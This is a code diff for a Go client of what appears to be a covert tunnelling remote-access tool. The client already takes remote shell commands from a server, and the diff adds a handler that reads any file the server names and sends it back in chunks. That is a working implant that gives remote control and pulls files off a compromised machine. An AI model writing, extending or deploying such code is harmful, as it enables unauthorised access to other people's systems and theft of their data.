@@ -2,7 +2,9 @@ package main
 
 import (
 	"container/list"
+	"encoding/binary"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"time"
 )
@@ -141,7 +143,6 @@ func (c *GTClient) handleShell(t *TunnelData) {
 						})
 						res = res[MaxPayloadLength:]
 					}
-
 					c.sendList.PushBack(&TunnelData{
 						dataType: TunnelShellData,
 						clientID: c.clientID,
@@ -159,10 +160,62 @@ func (c *GTClient) handleShell(t *TunnelData) {
 	case TunnelShellQuit:
 		fmt.Println("[*] Quit shell")
 		os.Exit(0)
+	default:
+		break
 	}
 }
 
-func (c *GTClient) handleFile(t *TunnelData) {}
+func (c *GTClient) handleFile(t *TunnelData) {
+	switch t.dataType {
+	case TunnelFileGet:
+		dat, err := ioutil.ReadFile(string(t.payload))
+		if err != nil || len(dat) > 1024*1024*10 {
+			c.sendList.PushBack(&TunnelData{
+				dataType: TunnelFileError,
+				clientID: c.clientID,
+				serverID: c.serverID,
+				payload:  []byte{},
+			})
+		}
+		fmt.Println("[*] Download", string(t.payload))
+		// send file info
+		size := make([]byte, 4)
+		binary.LittleEndian.PutUint32(size, uint32(len(dat)))
+		c.sendList.PushBack(&TunnelData{
+			dataType: TunnelFileInfo,
+			clientID: c.clientID,
+			serverID: c.serverID,
+			payload:  size,
+		})
+
+		// chunk
+		for len(dat) > MaxPayloadLength {
+			c.sendList.PushBack(&TunnelData{
+				dataType: TunnelFileData,
+				clientID: c.clientID,
+				serverID: c.serverID,
+				payload:  dat[:MaxPayloadLength],
+			})
+			dat = dat[MaxPayloadLength:]
+		}
+		c.sendList.PushBack(&TunnelData{
+			dataType: TunnelFileData,
+			clientID: c.clientID,
+			serverID: c.serverID,
+			payload:  dat,
+		})
+
+		// file end
+		c.sendList.PushBack(&TunnelData{
+			dataType: TunnelFileEnd,
+			clientID: c.clientID,
+			serverID: c.serverID,
+			payload:  []byte{},
+		})
+	default:
+		break
+	}
+}
 
 func main() {
 	fmt.Println("[*] Start")
